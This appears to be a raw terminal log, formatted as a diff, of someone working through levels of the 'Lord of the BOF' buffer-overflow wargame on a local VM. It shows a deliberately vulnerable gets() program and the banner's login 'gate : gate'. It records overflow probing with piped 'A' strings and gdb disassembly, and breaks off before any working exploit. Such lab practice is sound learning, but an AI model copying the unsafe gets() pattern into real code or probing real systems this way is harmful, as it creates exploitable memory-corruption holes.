@@ -1,0 +1,1400 @@
+cobolt
+hacking exposed
+
+
+Xshell 5 (Build 1055)
+Copyright (c) 2002-2016 NetSarang Computer, Inc. All rights reserved.
+
+Type `help' to learn how to use Xshell prompt.
+[c:\~]$ 
+
+Connecting to 192.168.56.129:23...
+Connection established.
+To escape to local shell, press 'Ctrl+Alt+]'.
+                                            _______________________
+  _______________________-------------------                       `\
+ /:--__                                                              |
+||< > |                                   ___________________________/
+| \__/_________________-------------------                         |
+|                                                                  |
+ |        The Lord of the BOF : The Fellowship of the BOF, 2010    |
+ |                                                                  |
+ |                                                                  |
+  |       [enter to the dungeon]                                    |
+  |       gate : gate                                                |
+  |                                                                  |
+  |       [RULE]                                                     |
+   |      - do not use local root exploit                             |
+   |      - do not use LD_PRELOAD to my-pass                          |
+   |      - do not use single boot                    [h4ck3rsch001] |
+  |                                              ____________________|_
+  |  ___________________-------------------------                      `\
+  |/`--_                                                                 |
+  ||[ ]||                                            ___________________/
+   \===/___________________-------------------------- 
+
+
+login: g
+Password: 
+Login incorrect
+
+login: cobolt
+Password: 
+Last login: Fri Feb  9 16:44:46 from 192.168.56.1
+[cobolt@localhost cobolt]$ ls
+core  gablin  goblin  goblin.c
+[cobolt@localhost cobolt]$ cat goblin.c
+/*
+        The Lord of the BOF : The Fellowship of the BOF
+        - goblin
+        - small buffer + stdin
+*/
+
+int main()
+{
+    char buffer[16];
+    gets(buffer);
+    printf("%s\n", buffer);
+}
+[cobolt@localhost cobolt]$ exit       
+logout
+
+Connection closed by foreign host.
+
+Disconnected from remote host(LOB) at 22:41:29.
+
+Type `help' to learn how to use Xshell prompt.
+[c:\~]$ 
+
+Connecting to 192.168.56.129:23...
+Connection established.
+To escape to local shell, press 'Ctrl+Alt+]'.
+                                            _______________________
+  _______________________-------------------                       `\
+ /:--__                                                              |
+||< > |                                   ___________________________/
+| \__/_________________-------------------                         |
+|                                                                  |
+ |        The Lord of the BOF : The Fellowship of the BOF, 2010    |
+ |                                                                  |
+ |                                                                  |
+  |       [enter to the dungeon]                                    |
+  |       gate : gate                                                |
+  |                                                                  |
+  |       [RULE]                                                     |
+   |      - do not use local root exploit                             |
+   |      - do not use LD_PRELOAD to my-pass                          |
+   |      - do not use single boot                    [h4ck3rsch001] |
+  |                                              ____________________|_
+  |  ___________________-------------------------                      `\
+  |/`--_                                                                 |
+  ||[ ]||                                            ___________________/
+   \===/___________________-------------------------- 
+
+
+login: gremlin
+Password: 
+Login incorrect
+
+login: gremlin
+Password: 
+Last login: Wed Feb 14 03:05:19 from 192.168.56.1
+[gremlin@localhost gremlin]$ ls
+cobalt  cobolt  cobolt.c  core  tmp
+[gremlin@localhost gremlin]$ vi exp.txt
+[gremlin@localhost gremlin]$ cat exp.txt
+AAAAAAAAAAAAAAAA
+[gremlin@localhost gremlin]$ cat exp.txt | cat hi
+cat: hi: No such file or directory
+[gremlin@localhost gremlin]$ cat exp.txt | cat hi;
+cat: hi: No such file or directory
+[gremlin@localhost gremlin]$ cat exp.txt | cat "hi"
+cat: hi: No such file or directory
+[gremlin@localhost gremlin]$ cat exp.txt | ls      
+cobalt  cobolt  cobolt.c  core  exp.txt  tmp
+[gremlin@localhost gremlin]$  ls
+cobalt  cobolt  cobolt.c  core  exp.txt  tmp
+[gremlin@localhost gremlin]$ cat exp.txt     
+AAAAAAAAAAAAAAAA
+[gremlin@localhost gremlin]$ ls | grep exp.txt
+exp.txt
+[gremlin@localhost gremlin]$ ls | cat  exp.txt
+AAAAAAAAAAAAAAAA
+Broken pipe
+[gremlin@localhost gremlin]$ ls | cat exp.txt
+AAAAAAAAAAAAAAAA
+[gremlin@localhost gremlin]$ ls |cat exp.txt
+AAAAAAAAAAAAAAAA
+[gremlin@localhost gremlin]$ ls |  cat exp.txt
+AAAAAAAAAAAAAAAA
+[gremlin@localhost gremlin]$ ls |  cat  exp.txt
+AAAAAAAAAAAAAAAA
+[gremlin@localhost gremlin]$ ls |  cat  exp.txt
+AAAAAAAAAAAAAAAA
+Broken pipe
+[gremlin@localhost gremlin]$ ls |  cat  exp.txt
+AAAAAAAAAAAAAAAA
+[gremlin@localhost gremlin]$ ls |  cat  exp.txt
+AAAAAAAAAAAAAAAA
+[gremlin@localhost gremlin]$ ls |  cat  exp.txt
+AAAAAAAAAAAAAAAA
+Broken pipe
+[gremlin@localhost gremlin]$ ls |  cat  exp.txt
+AAAAAAAAAAAAAAAA
+[gremlin@localhost gremlin]$ ls |  cat  exp.txt
+AAAAAAAAAAAAAAAA
+[gremlin@localhost gremlin]$ ls |  cat  exp.txt
+AAAAAAAAAAAAAAAA
+Broken pipe
+[gremlin@localhost gremlin]$ ls | grep exp.txt
+exp.txt
+[gremlin@localhost gremlin]$ grep exp.txt
+asdf ext.txtd
+f;
+
+[gremlin@localhost gremlin]$ grep ls     
+
+ls
+ls
+ls
+ls
+d
+ls
+ls
+^[[A^[[B
+[gremlin@localhost gremlin]$ grep exp.txt
+ext^Hp
+exp.txt
+exp.txt
+^[[B^[[Aasdf
+ext^Hp
+exp.txtdsaf
+exp.txtdsaf
+
+[gremlin@localhost gremlin]$ cat
+
+
+
+
+d
+d
+
+
+fa
+fa
+cat
+cat
+asfd
+asfd
+fasdf
+fasdf
+
+[gremlin@localhost gremlin]$ ./gablin <exp.txt
+bash: ./gablin: No such file or directory
+[gremlin@localhost gremlin]$ ls
+cobalt  cobolt  cobolt.c  core  exp.txt  tmp
+[gremlin@localhost gremlin]$ ./cobalt <exp.txt
+argv error
+[gremlin@localhost gremlin]$ ./cobalt < exp.txt
+argv error
+[gremlin@localhost gremlin]$ ls
+cobalt  cobolt  cobolt.c  core  exp.txt  tmp
+[gremlin@localhost gremlin]$ ./cobalt cat exp.txt
+cat
+[gremlin@localhost gremlin]$ cat exp.txt
+AAAAAAAAAAAAAAAA
+[gremlin@localhost gremlin]$ cat exp.txt | ./cobalt
+argv error
+[gremlin@localhost gremlin]$ vi
+[gremlin@localhost gremlin]$ vi test.c
+[gremlin@localhost gremlin]$ gcc test.c -o test
+/tmp/cc5qarEP.o: In function `main':
+/tmp/cc5qarEP.o(.text+0xb): the `gets' function is dangerous and should not be used.
+[gremlin@localhost gremlin]$ ls
+cobalt  cobolt  cobolt.c  core  exp.txt  test  test.c  tmp
+[gremlin@localhost gremlin]$ cat exp.txt | ./test  
+AAAAAAAAAAAAAAAA
+[gremlin@localhost gremlin]$ python -c 'print "A"'
+A
+[gremlin@localhost gremlin]$ python -c 'print "A"' | ./test
+A
+[gremlin@localhost gremlin]$ python -c 'print "A"*30' | ./test
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+[gremlin@localhost gremlin]$ python -c 'print "A"*300' | ./test
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+[gremlin@localhost gremlin]$ python -c 'print "A"*30000' | ./test
+Traceback (innermost last):
+  File "<string>", line 1, in ?
+IOError: [Errno 32] Broken pipe
+[gremlin@localhost gremlin]$     
+[gremlin@localhost gremlin]$ 
+[gremlin@localhost gremlin]$ 
+[gremlin@localhost gremlin]$ 
+[gremlin@localhost gremlin]$ 
+[gremlin@localhost gremlin]$ clear
+[gremlin@localhost gremlin]$ exi
+bash: exi: command not found
+[gremlin@localhost gremlin]$ 
+[gremlin@localhost gremlin]$ 
+[gremlin@localhost gremlin]$ 
+[gremlin@localhost gremlin]$ 
+[gremlin@localhost gremlin]$ 
+[gremlin@localhost gremlin]$ 
+[gremlin@localhost gremlin]$ 
+[gremlin@localhost gremlin]$ 
+[gremlin@localhost gremlin]$ 
+[gremlin@localhost gremlin]$ 
+[gremlin@localhost gremlin]$ 
+[gremlin@localhost gremlin]$ 
+[gremlin@localhost gremlin]$ exit
+logout
+
+Connection closed by foreign host.
+
+Disconnected from remote host(LOB) at 22:52:45.
+
+Type `help' to learn how to use Xshell prompt.
+[c:\~]$ 
+
+Connecting to 192.168.56.129:23...
+Connection established.
+To escape to local shell, press 'Ctrl+Alt+]'.
+                                            _______________________
+  _______________________-------------------                       `\
+ /:--__                                                              |
+||< > |                                   ___________________________/
+| \__/_________________-------------------                         |
+|                                                                  |
+ |        The Lord of the BOF : The Fellowship of the BOF, 2010    |
+ |                                                                  |
+ |                                                                  |
+  |       [enter to the dungeon]                                    |
+  |       gate : gate                                                |
+  |                                                                  |
+  |       [RULE]                                                     |
+   |      - do not use local root exploit                             |
+   |      - do not use LD_PRELOAD to my-pass                          |
+   |      - do not use single boot                    [h4ck3rsch001] |
+  |                                              ____________________|_
+  |  ___________________-------------------------                      `\
+  |/`--_                                                                 |
+  ||[ ]||                                            ___________________/
+   \===/___________________-------------------------- 
+
+
+login: 
+Connection closed by foreign host.
+
+Disconnected from remote host(LOB) at 22:55:07.
+
+Type `help' to learn how to use Xshell prompt.
+[c:\~]$ 
+
+Connecting to 192.168.56.129:23...
+Connection established.
+To escape to local shell, press 'Ctrl+Alt+]'.
+                                            _______________________
+  _______________________-------------------                       `\
+ /:--__                                                              |
+||< > |                                   ___________________________/
+| \__/_________________-------------------                         |
+|                                                                  |
+ |        The Lord of the BOF : The Fellowship of the BOF, 2010    |
+ |                                                                  |
+ |                                                                  |
+  |       [enter to the dungeon]                                    |
+  |       gate : gate                                                |
+  |                                                                  |
+  |       [RULE]                                                     |
+   |      - do not use local root exploit                             |
+   |      - do not use LD_PRELOAD to my-pass                          |
+   |      - do not use single boot                    [h4ck3rsch001] |
+  |                                              ____________________|_
+  |  ___________________-------------------------                      `\
+  |/`--_                                                                 |
+  ||[ ]||                                            ___________________/
+   \===/___________________-------------------------- 
+
+
+login: gremlin
+Password: 
+Login incorrect
+
+login: gremlin
+Password: 
+Login incorrect
+
+login: gremlin
+Password: 
+Last login: Thu Feb 15 22:43:11 from 192.168.56.1
+[gremlin@localhost gremlin]$ ls
+cobalt  cobolt  cobolt.c  core  exp.txt  test  test.c  tmp
+[gremlin@localhost gremlin]$ python -c 'print "A"*300' | ./test
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+[gremlin@localhost gremlin]$ cat exp.txt | ./test
+AAAAAAAAAAAAAAAA
+[gremlin@localhost gremlin]$ cat exp.txt cat | ./test
+cat: cat: No such file or directory
+AAAAAAAAAAAAAAAA
+[gremlin@localhost gremlin]$ cat exp.txt; cat | ./test
+AAAAAAAAAAAAAAAA
+fas
+fas
+fas
+Broken pipe
+[gremlin@localhost gremlin]$ fas
+bash: fas: command not found
+[gremlin@localhost gremlin]$ vi test.c
+[gremlin@localhost gremlin]$ gcc test.c -o test
+/tmp/ccxbbF3G.o: In function `main':
+/tmp/ccxbbF3G.o(.text+0xb): the `gets' function is dangerous and should not be used.
+[gremlin@localhost gremlin]$ python -c 'print "A"*30' | ./test
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+hihihihihihihihihihihihi
+[gremlin@localhost gremlin]$ cat exp.txt; | ./test
+bash: syntax error near unexpected token `|'
+[gremlin@localhost gremlin]$ cat exp.txt | ./test
+AAAAAAAAAAAAAAAA
+hihihihihihihihihihihihi
+[gremlin@localhost gremlin]$ cat exp.txt; | ./test
+bash: syntax error near unexpected token `|'
+[gremlin@localhost gremlin]$ cat exp.txt | ./test
+AAAAAAAAAAAAAAAA
+hihihihihihihihihihihihi
+[gremlin@localhost gremlin]$ cat exp.txt; cat | ./test
+AAAAAAAAAAAAAAAA
+fads
+fads
+hihihihihihihihihihihihi
+d
+Broken pipe
+[gremlin@localhost gremlin]$ exit
+logout
+
+Connection closed by foreign host.
+
+Disconnected from remote host(LOB) at 22:59:50.
+
+Type `help' to learn how to use Xshell prompt.
+[c:\~]$ 
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+[cobolt@localhost cobolt]$ cat ex.txt | ./goblin
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+[cobolt@localhost cobolt]$ cat ex.txt | ./gablin
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+[cobolt@localhost cobolt]$ ./gablin
+asdf
+asdf
+[cobolt@localhost cobolt]$ python -c 'print "A"' | ./gablin
+A
+[cobolt@localhost cobolt]$ python -c 'print "A"'; cat | ./gablin
+A
+fda
+fda
+d
+Broken pipe
+[cobolt@localhost cobolt]$ ls
+asdf.txt  core  ex.txt  gablin  goblin  goblin.c
+[cobolt@localhost cobolt]$ rm core
+[cobolt@localhost cobolt]$ python -c 'print "A"*60'; cat | ./gablin
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+f
+f
+
+Broken pipe
+[cobolt@localhost cobolt]$ ls
+asdf.txt  ex.txt  gablin  goblin  goblin.c
+[cobolt@localhost cobolt]$ python -c 'print "A"*60' cat | ./gablin
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+[cobolt@localhost cobolt]$ python -c 'print "A"*60'; cat | ./gablin
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+
+
+
+Broken pipe
+[cobolt@localhost cobolt]$ ls
+asdf.txt  core  ex.txt  gablin  goblin  goblin.c
+[cobolt@localhost cobolt]$ rm core
+[cobolt@localhost cobolt]$ ls
+asdf.txt  ex.txt  gablin  goblin  goblin.c
+[cobolt@localhost cobolt]$ python -c 'print "A"*60'; cat | ./gablin
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+
+
+
+Broken pipe
+[cobolt@localhost cobolt]$ ls
+asdf.txt  ex.txt  gablin  goblin  goblin.c
+[cobolt@localhost cobolt]$ python -c 'print "A"*60'; cat | ./gablin
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+
+
+
+Broken pipe
+[cobolt@localhost cobolt]$ ls
+asdf.txt  ex.txt  gablin  goblin  goblin.c
+[cobolt@localhost cobolt]$ python -c 'print "A"*60'; cat | ./gablin
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+asdfasdfasdf
+asdfasdfasdf
+;
+Broken pipe
+[cobolt@localhost cobolt]$ ls
+asdf.txt  ex.txt  gablin  goblin  goblin.c
+[cobolt@localhost cobolt]$ python -c 'print "A"*60'; cat | ./gablin
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+Broken pipeA
+[cobolt@localhost cobolt]$ 
+[cobolt@localhost cobolt]$ ls
+asdf.txt  ex.txt  gablin  goblin  goblin.c
+[cobolt@localhost cobolt]$ python -c 'print "A"*60'; cat | ./gablin
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+
+
+
+Broken pipe
+[cobolt@localhost cobolt]$ ls
+asdf.txt  ex.txt  gablin  goblin  goblin.c
+[cobolt@localhost cobolt]$ python -c 'print "A"*600'; cat | ./gablin
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+
+
+
+Broken pipe
+[cobolt@localhost cobolt]$ ls
+asdf.txt  ex.txt  gablin  goblin  goblin.c
+[cobolt@localhost cobolt]$ python -c 'print "A"*600'; cat | ./goblin
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+asdf
+asdf
+ls
+Broken pipe
+[cobolt@localhost cobolt]$ 
+[cobolt@localhost cobolt]$ ls
+asdf.txt  ex.txt  gablin  goblin  goblin.c
+[cobolt@localhost cobolt]$ python -c 'print "A"*600'; cat | ./goblin
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+ls
+ls
+dir
+Broken pipe
+[cobolt@localhost cobolt]$ ls
+asdf.txt  ex.txt  gablin  goblin  goblin.c
+[cobolt@localhost cobolt]$ gdb -q gablin
+(gdb) ls
+Undefined command: "ls".  Try "help".
+(gdb) disas main
+Dump of assembler code for function main:
+0x80483f8 <main>:	push   %ebp
+0x80483f9 <main+1>:	mov    %esp,%ebp
+0x80483fb <main+3>:	sub    $0x10,%esp
+0x80483fe <main+6>:	lea    0xfffffff0(%ebp),%eax
+0x8048401 <main+9>:	push   %eax
+0x8048402 <main+10>:	call   0x804830c <gets>
+0x8048407 <main+15>:	add    $0x4,%esp
+0x804840a <main+18>:	lea    0xfffffff0(%ebp),%eax
+0x804840d <main+21>:	push   %eax
+0x804840e <main+22>:	push   $0x8048470
+0x8048413 <main+27>:	call   0x804833c <printf>
+0x8048418 <main+32>:	add    $0x8,%esp
+0x804841b <main+35>:	leave  
+0x804841c <main+36>:	ret    
+0x804841d <main+37>:	nop    
+0x804841e <main+38>:	nop    
+0x804841f <main+39>:	nop    
+End of assembler dump.
+(gdb) l
+1	init.c: No such file or directory.
+(gdb) list
+1	in init.c
+(gdb) 
+1	in init.c
+(gdb) 
+1	in init.c
+(gdb) 
+1	in init.c
+(gdb) 
+1	in init.c
+(gdb) q
+[cobolt@localhost cobolt]$ cat goblin.c
+/*
+        The Lord of the BOF : The Fellowship of the BOF
+        - goblin
+        - small buffer + stdin
+*/
+
+int main()
+{
+    char buffer[16];
+    gets(buffer);
+    printf("%s\n", buffer);
+}
+[cobolt@localhost cobolt]$ gdb -q gablin
+(gdb) disas main
+Dump of assembler code for function main:
+0x80483f8 <main>:	push   %ebp
+0x80483f9 <main+1>:	mov    %esp,%ebp
+0x80483fb <main+3>:	sub    $0x10,%esp
+0x80483fe <main+6>:	lea    0xfffffff0(%ebp),%eax
+0x8048401 <main+9>:	push   %eax
+0x8048402 <main+10>:	call   0x804830c <gets>
+0x8048407 <main+15>:	add    $0x4,%esp
+0x804840a <main+18>:	lea    0xfffffff0(%ebp),%eax
+0x804840d <main+21>:	push   %eax
+0x804840e <main+22>:	push   $0x8048470
+0x8048413 <main+27>:	call   0x804833c <printf>
+0x8048418 <main+32>:	add    $0x8,%esp
+0x804841b <main+35>:	leave  
+0x804841c <main+36>:	ret    
+0x804841d <main+37>:	nop    
+0x804841e <main+38>:	nop    
+0x804841f <main+39>:	nop    
+End of assembler dump.
+(gdb) r aa | ./gablin
+Starting program: /home/cobolt/gablin aa | ./gablin
+asfd
+asfd
+
+Program exited with code 05.
+You can't do that without a process to debug.
+(gdb) 
+(gdb) r
+Starting program: /home/cobolt/gablin aa | ./gablin
+adffasf
+adffasf
+
+Program exited with code 010.
+You can't do that without a process to debug.
+(gdb) r
+Starting program: /home/cobolt/gablin aa | ./gablin
+f
+f
+
+Program exited with code 02.
+You can't do that without a process to debug.
+(gdb) q 
+[cobolt@localhost cobolt]$ gdb -q gablin
+(gdb) disas min
+No symbol "min" in current context.
+(gdb) disas main
+Dump of assembler code for function main:
+0x80483f8 <main>:	push   %ebp
+0x80483f9 <main+1>:	mov    %esp,%ebp
+0x80483fb <main+3>:	sub    $0x10,%esp
+0x80483fe <main+6>:	lea    0xfffffff0(%ebp),%eax
+0x8048401 <main+9>:	push   %eax
+0x8048402 <main+10>:	call   0x804830c <gets>
+0x8048407 <main+15>:	add    $0x4,%esp
+0x804840a <main+18>:	lea    0xfffffff0(%ebp),%eax
+0x804840d <main+21>:	push   %eax
+0x804840e <main+22>:	push   $0x8048470
+0x8048413 <main+27>:	call   0x804833c <printf>
+0x8048418 <main+32>:	add    $0x8,%esp
+0x804841b <main+35>:	leave  
+0x804841c <main+36>:	ret    
+0x804841d <main+37>:	nop    
+0x804841e <main+38>:	nop    
+0x804841f <main+39>:	nop    
+End of assembler dump.
+(gdb) 
+Dump of assembler code for function main:
+0x80483f8 <main>:	push   %ebp
+0x80483f9 <main+1>:	mov    %esp,%ebp
+0x80483fb <main+3>:	sub    $0x10,%esp
+0x80483fe <main+6>:	lea    0xfffffff0(%ebp),%eax
+0x8048401 <main+9>:	push   %eax
+0x8048402 <main+10>:	call   0x804830c <gets>
+0x8048407 <main+15>:	add    $0x4,%esp
+0x804840a <main+18>:	lea    0xfffffff0(%ebp),%eax
+0x804840d <main+21>:	push   %eax
+0x804840e <main+22>:	push   $0x8048470
+0x8048413 <main+27>:	call   0x804833c <printf>
+0x8048418 <main+32>:	add    $0x8,%esp
+0x804841b <main+35>:	leave  
+0x804841c <main+36>:	ret    
+0x804841d <main+37>:	nop    
+0x804841e <main+38>:	nop    
+0x804841f <main+39>:	nop    
+End of assembler dump.
+(gdb) set disassembly-flavor intel
+(gdb) 
+(gdb) disas main
+Dump of assembler code for function main:
+0x80483f8 <main>:	push   %ebp
+0x80483f9 <main+1>:	mov    %ebp,%esp
+0x80483fb <main+3>:	sub    %esp,16
+0x80483fe <main+6>:	lea    %eax,[%ebp-16]
+0x8048401 <main+9>:	push   %eax
+0x8048402 <main+10>:	call   0x804830c <gets>
+0x8048407 <main+15>:	add    %esp,4
+0x804840a <main+18>:	lea    %eax,[%ebp-16]
+0x804840d <main+21>:	push   %eax
+0x804840e <main+22>:	push   0x8048470
+0x8048413 <main+27>:	call   0x804833c <printf>
+0x8048418 <main+32>:	add    %esp,8
+0x804841b <main+35>:	leave  
+0x804841c <main+36>:	ret    
+0x804841d <main+37>:	nop    
+0x804841e <main+38>:	nop    
+0x804841f <main+39>:	nop    
+End of assembler dump.
+(gdb) b *main+32
+Breakpoint 1 at 0x8048418
+(gdb) r
+Starting program: /home/cobolt/gablin 
+x 0x8048470
+x 0x8048470
+
+Breakpoint 1, 0x8048418 in main ()
+(gdb) 
+(gdb) r
+The program being debugged has been started already.
+Start it from the beginning? (y or n) y
+Starting program: /home/cobolt/gablin 
+
+
+
+Breakpoint 1, 0x8048418 in main ()
+(gdb) r
+The program being debugged has been started already.
+Start it from the beginning? (y or n) y
+Starting program: /home/cobolt/gablin 
+asdf
+asdf
+
+Breakpoint 1, 0x8048418 in main ()
+(gdb) x 0x8048470
+0x8048470 <_IO_stdin_used+4>:	0x000a7325
+(gdb) 
+0x8048474:	0x00000000
+(gdb) 
+0x8048478:	0x08049490
+(gdb) 
+0x804847c:	0x00000000
+(gdb) x 0x000a7325
+0xa7325:	Cannot access memory at address 0xa7325
+(gdb) disas main
+Dump of assembler code for function main:
+0x80483f8 <main>:	push   %ebp
+0x80483f9 <main+1>:	mov    %ebp,%esp
+0x80483fb <main+3>:	sub    %esp,16
+0x80483fe <main+6>:	lea    %eax,[%ebp-16]
+0x8048401 <main+9>:	push   %eax
+0x8048402 <main+10>:	call   0x804830c <gets>
+0x8048407 <main+15>:	add    %esp,4
+0x804840a <main+18>:	lea    %eax,[%ebp-16]
+0x804840d <main+21>:	push   %eax
+0x804840e <main+22>:	push   0x8048470
+0x8048413 <main+27>:	call   0x804833c <printf>
+0x8048418 <main+32>:	add    %esp,8
+0x804841b <main+35>:	leave  
+0x804841c <main+36>:	ret    
+0x804841d <main+37>:	nop    
+0x804841e <main+38>:	nop    
+0x804841f <main+39>:	nop    
+End of assembler dump.
+(gdb) b info
+Function "info" not defined.
+(gdb) info b
+Num Type           Disp Enb Address    What
+1   breakpoint     keep y   0x08048418  <main+32>
+	breakpoint already hit 1 time
+(gdb) cl 1
+No breakpoint at 1.
+(gdb) info b
+Num Type           Disp Enb Address    What
+1   breakpoint     keep y   0x08048418  <main+32>
+	breakpoint already hit 1 time
+(gdb) cl
+No source file specified.
+(gdb) d 1
+(gdb) info b
+No breakpoints or watchpoints.
+(gdb) disas main
+Dump of assembler code for function main:
+0x80483f8 <main>:	push   %ebp
+0x80483f9 <main+1>:	mov    %ebp,%esp
+0x80483fb <main+3>:	sub    %esp,16
+0x80483fe <main+6>:	lea    %eax,[%ebp-16]
+0x8048401 <main+9>:	push   %eax
+0x8048402 <main+10>:	call   0x804830c <gets>
+0x8048407 <main+15>:	add    %esp,4
+0x804840a <main+18>:	lea    %eax,[%ebp-16]
+0x804840d <main+21>:	push   %eax
+0x804840e <main+22>:	push   0x8048470
+0x8048413 <main+27>:	call   0x804833c <printf>
+0x8048418 <main+32>:	add    %esp,8
+0x804841b <main+35>:	leave  
+0x804841c <main+36>:	ret    
+0x804841d <main+37>:	nop    
+0x804841e <main+38>:	nop    
+0x804841f <main+39>:	nop    
+End of assembler dump.
+(gdb) q       
+The program is running.  Exit anyway? (y or n) y
+[cobolt@localhost cobolt]$ gdb -q gablin
+(gdb) info b
+No breakpoints or watchpoints.
+(gdb) b *main+9
+Breakpoint 1 at 0x8048401
+(gdb) r
+Starting program: /home/cobolt/gablin 
+
+Breakpoint 1, 0x8048401 in main ()
+(gdb) $esp
+Undefined command: "".  Try "help".
+(gdb) x/8b$esp
+0xbffffaf8:	0x08	0xfb	0xff	0xbf	0xeb	0x83	0x04	0x08
